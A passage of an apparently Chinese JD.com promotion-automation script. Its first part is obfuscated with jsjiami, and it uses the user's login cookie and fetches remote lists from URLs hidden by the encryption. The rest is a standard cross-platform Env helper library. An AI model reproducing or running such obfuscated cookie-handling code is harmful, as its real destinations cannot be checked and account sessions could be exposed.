_0x31081d[_0x1c4c('57','Qe)N')](_0x4c223f);}};if(_0x31081d[_0x1c4c('58','!ZBN')](_0x31081d[_0x1c4c('59','!ZBN')],_0x31081d[_0x1c4c('5a','b(nM')])){let _0xc20712=+new Date();let _0x51bc6c=_0x4c05dd[_0x1c4c('5b','U]87')];let _0x77ff7d={'url':_0x1c4c('5c',')#7z')+ +new Date(),'headers':{'Host':_0x31081d[_0x1c4c('5d','!ZBN')],'accept':_0x31081d[_0x1c4c('5e','^5qj')],'content-type':_0x31081d[_0x1c4c('5f','rug0')],'origin':_0x31081d[_0x1c4c('60','^ru9')],'accept-language':_0x31081d[_0x1c4c('61','TKR1')],'user-agent':$[_0x1c4c('62','v5Se')]()?process[_0x1c4c('63','ctkD')][_0x1c4c('64','F^(z')]?process[_0x1c4c('65','U]87')][_0x1c4c('1b','xME*')]:_0x31081d[_0x1c4c('66','HFuN')](require,_0x31081d[_0x1c4c('67','v5Se')])[_0x1c4c('68','HFuN')]:$[_0x1c4c('69','F^(z')](_0x31081d[_0x1c4c('6a','gTM6')])?$[_0x1c4c('6b',')#7z')](_0x31081d[_0x1c4c('6c','zDSm')]):_0x31081d[_0x1c4c('6d','NPNG')],'referer':_0x1c4c('6e','U]87')+_0x51bc6c,'Cookie':cookie},'body':_0x1c4c('6f','zuDD')+_0x31081d[_0x1c4c('70','NIHV')](escape,_0x51bc6c)+_0x1c4c('71','gTM6')+_0xc20712};$[_0x1c4c('72','@XS*')](_0x77ff7d,(_0x31763f,_0x541a8f,_0x2beb05)=>{try{if(_0x31081d[_0x1c4c('73','fP2n')](_0x31081d[_0x1c4c('74','[8vX')],_0x31081d[_0x1c4c('75','U]87')])){if(_0x31763f){if(_0x31081d[_0x1c4c('76','N8h9')](_0x31081d[_0x1c4c('77','U]87')],_0x31081d[_0x1c4c('78','Ix6#')])){$[_0x1c4c('79','[8vX')](e,resp);}else{console[_0x1c4c('7a','6edg')]($[_0x1c4c('7b','U]87')]+_0x1c4c('7c','[8vX'));}}else{if(_0x31081d[_0x1c4c('7d','0($s')](_0x31081d[_0x1c4c('7e','&p^S')],_0x31081d[_0x1c4c('7f','g!oI')])){_0x2beb05=JSON[_0x1c4c('80','yHG2')](_0x2beb05);}else{_0x2ed2e6[_0x1c4c('81','V0PA')](_0x56db14);}}}else{$[_0x1c4c('82','6edg')](e,resp);}}catch(_0x4f7e53){$[_0x1c4c('83','TKR1')](_0x4f7e53,resp);}finally{_0x31081d[_0x1c4c('84','cKhR')](_0x56db14);}});}else{if(err){console[_0x1c4c('85','laGG')]($[_0x1c4c('86','xME*')]+_0x1c4c('87','aRCM'));}else{data=JSON[_0x1c4c('88','**Jz')](data);}}});}function shuye72(){var _0x3d8b90={'FmsQf':function(_0x5cea7c){return _0x5cea7c();},'wVgkv':function(_0x3164f0,_0x194ad2){return _0x3164f0!==_0x194ad2;},'MNNUT':_0x1c4c('89','0gnv'),'OENgX':_0x1c4c('8a','cKhR'),'dBjEg':function(_0xe528c7,_0x4fe51c){return _0xe528c7===_0x4fe51c;},'EAjUi':_0x1c4c('8b','^5qj'),'yKrmV':_0x1c4c('8c','SREd'),'yJxQw':function(_0x5ad1bc,_0x492b2f){return _0x5ad1bc<_0x492b2f;},'aHocF':_0x1c4c('8d','Qe)N'),'xhFfC':function(_0x557ff8,_0x31bf45){return _0x557ff8(_0x31bf45);},'aSJWu':_0x1c4c('8e','VB]u'),'GvVWO':_0x1c4c('8f','!ZBN'),'IvSqp':_0x1c4c('90','laGG'),'BGyVK':_0x1c4c('91','g!oI'),'zlaQQ':_0x1c4c('92','O$gq'),'KYaNw':_0x1c4c('93','V0PA')};return new Promise(_0x507dff=>{var _0x2e7d46={'LuIgF':function(_0x246d2a){return _0x3d8b90[_0x1c4c('94','N8h9')](_0x246d2a);},'AKgma':function(_0x179a83,_0x347392){return _0x3d8b90[_0x1c4c('95','Qe)N')](_0x179a83,_0x347392);},'DPNzL':_0x3d8b90[_0x1c4c('96',')UhF')],'rtWNt':_0x3d8b90[_0x1c4c('97','0($s')],'WsisB':function(_0x572400,_0x13bcb2){return _0x3d8b90[_0x1c4c('98','b(nM')](_0x572400,_0x13bcb2);},'faCbq':_0x3d8b90[_0x1c4c('99','cKhR')],'qtIjp':function(_0x33ceca,_0x2e3f8a){return _0x3d8b90[_0x1c4c('9a',')#7z')](_0x33ceca,_0x2e3f8a);},'PuRpj':_0x3d8b90[_0x1c4c('9b','aRCM')],'sTDlu':function(_0x127c0b,_0x30040a){return _0x3d8b90[_0x1c4c('9c','gU#n')](_0x127c0b,_0x30040a);},'dpTBu':function(_0x419584,_0x3ff3a5){return _0x3d8b90[_0x1c4c('9d','&p^S')](_0x419584,_0x3ff3a5);},'IDDKe':_0x3d8b90[_0x1c4c('9e','0gnv')],'pFqnu':function(_0x20db6f,_0x16629a){return _0x3d8b90[_0x1c4c('9f','VB]u')](_0x20db6f,_0x16629a);},'DDpjj':_0x3d8b90[_0x1c4c('a0','1vNp')],'AMalE':_0x3d8b90[_0x1c4c('a1','g!oI')],'TesZu':function(_0x3f2efb){return _0x3d8b90[_0x1c4c('a2','HFuN')](_0x3f2efb);}};if(_0x3d8b90[_0x1c4c('a3','*o9[')](_0x3d8b90[_0x1c4c('a4','NIHV')],_0x3d8b90[_0x1c4c('a5','2XeD')])){console[_0x1c4c('a6','En%&')]($[_0x1c4c('a7','SREd')]+_0x1c4c('a8','ZAQc'));}else{$[_0x1c4c('a9','U]87')]({'url':_0x3d8b90[_0x1c4c('aa','Qe)N')],'headers':{'User-Agent':_0x3d8b90[_0x1c4c('ab','O$gq')]}},async(_0x3f09f8,_0xa0a066,_0x478123)=>{var _0x26a7dd={'qzYYs':function(_0x6c0cfd){return _0x2e7d46[_0x1c4c('ac','%J9v')](_0x6c0cfd);}};try{if(_0x2e7d46[_0x1c4c('ad','&p^S')](_0x2e7d46[_0x1c4c('ae','0($s')],_0x2e7d46[_0x1c4c('af','6edg')])){if(_0x3f09f8){if(_0x2e7d46[_0x1c4c('b0','SREd')](_0x2e7d46[_0x1c4c('b1','VB]u')],_0x2e7d46[_0x1c4c('b2','JTT8')])){console[_0x1c4c('b3','NIHV')]($[_0x1c4c('b4','En%&')]+_0x1c4c('b5','@XS*'));}else{$[_0x1c4c('b6','zDSm')](e,_0xa0a066);}}else{$[_0x1c4c('b7','SREd')]=JSON[_0x1c4c('b8','g!oI')](_0x478123);if(_0x2e7d46[_0x1c4c('b9','F^(z')]($[_0x1c4c('ba','O$gq')][_0x1c4c('bb','NIHV')],0x0)){if(_0x2e7d46[_0x1c4c('bc','F^(z')](_0x2e7d46[_0x1c4c('bd','^5qj')],_0x2e7d46[_0x1c4c('be','fP2n')])){for(let _0x3bbaf8=0x0;_0x2e7d46[_0x1c4c('bf','NPNG')](_0x3bbaf8,$[_0x1c4c('c0','^ru9')][_0x1c4c('c1','rug0')][_0x1c4c('c2','JTT8')]);_0x3bbaf8++){if(_0x2e7d46[_0x1c4c('c3','b(nM')](_0x2e7d46[_0x1c4c('c4','6edg')],_0x2e7d46[_0x1c4c('c5','SREd')])){console[_0x1c4c('c6','1vNp')]($[_0x1c4c('c7','1vNp')]+_0x1c4c('c8','zuDD'));}else{let _0x8f0ede=$[_0x1c4c('c9','0($s')][_0x1c4c('ca','NPNG')][_0x3bbaf8];await $[_0x1c4c('cb','N8h9')](0x1f4);await _0x2e7d46[_0x1c4c('cc','NPNG')](wuzhi01,_0x8f0ede);}}await $[_0x1c4c('cd','*o9[')](0x1f4);await _0x2e7d46[_0x1c4c('ce','N8h9')](shuye73);}else{_0x478123=JSON[_0x1c4c('b8','g!oI')](_0x478123);}}}}else{_0x26a7dd[_0x1c4c('cf','1vNp')](_0x507dff);}}catch(_0x4fdca2){$[_0x1c4c('d0','HFuN')](_0x4fdca2,_0xa0a066);}finally{if(_0x2e7d46[_0x1c4c('d1','ZAQc')](_0x2e7d46[_0x1c4c('d2','2XeD')],_0x2e7d46[_0x1c4c('d3','F^(z')])){$[_0x1c4c('d4','g!oI')](e,_0xa0a066);}else{_0x2e7d46[_0x1c4c('d5','JTT8')](_0x507dff);}}});}});}function shuye73(){var _0x4c118e={'vHhdf':function(_0x4f61f1,_0x55c9aa){return _0x4f61f1!==_0x55c9aa;},'EusJL':_0x1c4c('d6','NPNG'),'pfYdk':function(_0x399b73,_0x430003){return _0x399b73<_0x430003;},'eqyEw':function(_0x4ce237,_0x11bdb2){return _0x4ce237(_0x11bdb2);},'YoZDd':function(_0x4f023d){return _0x4f023d();},'kTyAi':_0x1c4c('d7','VB]u'),'yPUHR':_0x1c4c('d8','F^(z')};return new Promise(_0x37d344=>{$[_0x1c4c('d9','0($s')]({'url':_0x4c118e[_0x1c4c('da','HFuN')],'headers':{'User-Agent':_0x4c118e[_0x1c4c('db','F^(z')]}},async(_0x321454,_0x2f35e6,_0x51dab1)=>{try{if(_0x321454){if(_0x4c118e[_0x1c4c('dc','NPNG')](_0x4c118e[_0x1c4c('dd','%J9v')],_0x4c118e[_0x1c4c('de','Ix6#')])){_0x51dab1=JSON[_0x1c4c('df','HFuN')](_0x51dab1);}else{console[_0x1c4c('3d','HFuN')]($[_0x1c4c('e0','**Jz')]+_0x1c4c('37','%J9v'));}}else{$[_0x1c4c('e1','2XeD')]=JSON[_0x1c4c('e2','jC]4')](_0x51dab1);if(_0x4c118e[_0x1c4c('e3','V0PA')]($[_0x1c4c('e4','NPNG')][_0x1c4c('e5','0($s')],0x0)){for(let _0x34b2bf=0x0;_0x4c118e[_0x1c4c('e6','^5qj')](_0x34b2bf,$[_0x1c4c('e7','JTT8')][_0x1c4c('e8','1vNp')][_0x1c4c('e9','VB]u')]);_0x34b2bf++){let _0x46cf17=$[_0x1c4c('e4','NPNG')][_0x1c4c('ea',')UhF')][_0x34b2bf];await $[_0x1c4c('eb','204h')](0x1f4);await _0x4c118e[_0x1c4c('ec','6edg')](wuzhi02,_0x46cf17);}}}}catch(_0x16788f){$[_0x1c4c('ed','1vNp')](_0x16788f,_0x2f35e6);}finally{_0x4c118e[_0x1c4c('ee','cKhR')](_0x37d344);}});});};_0xodn='jsjiami.com.v6';
function taskGetUrl(function_id, body) {
  return {
    url: `https://api.m.jd.com/?appid=activities_platform&functionId=${function_id}&body=${escape(JSON.stringify(body))}&t=${+new Date()}`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'user-agent': $.isNode() ? (process.env.JS_USER_AGENT ? process.env.JS_USER_AGENT : (require('./JS_USER_AGENTS').USER_AGENT)) : ($.getdata('JSUA') ? $.getdata('JSUA') : "'jdltapp;iPad;3.1.0;14.4;network/wifi;Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      'Accept-Language': 'zh-Hans-CN;q=1,en-CN;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Content-Type': "application/x-www-form-urlencoded",
      "referer": "https://an.jd.com/babelDiy/Zeus/q1eB6WUB8oC4eH1BsCLWvQakVsX/index.html"
    }
  }
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            $.nickName = data['base'].nickname;
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}

function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}